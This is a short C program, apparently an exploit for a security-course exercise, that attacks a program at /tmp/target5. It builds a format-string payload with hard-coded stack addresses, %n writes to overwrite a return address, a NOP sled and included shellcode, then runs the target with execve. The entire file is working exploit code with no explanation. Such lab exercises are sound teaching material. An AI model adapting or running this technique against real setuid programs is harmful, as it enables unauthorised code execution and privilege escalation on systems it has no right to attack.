#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

static char payload[1024];

int main(void)
{
  char *args[3];
  char *env[1];
  char *fmtstr = "\x38\xfa\xff\xbf\x3c\xfa\xff\xbf\x38\xfa\xff\xbf\x3d\xfa\xff\xbf\x38\xfa\xff\xbf\x3e\xfa\xff\xbf\x38\xfa\xff\xbf\x3f\xfa\xff\xbf_%08x.%08x.%08x.%12c%n%180c%n%3c%n%192c%n";

  memset(payload, 0x90, sizeof (payload));
  memcpy(payload + 340, shellcode, strlen(shellcode));

  // "0xbffffa3c"
  strncpy(payload, fmtstr, strlen(fmtstr));
  
 // payload[40 + strlen(shellcode)] = '\0';

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
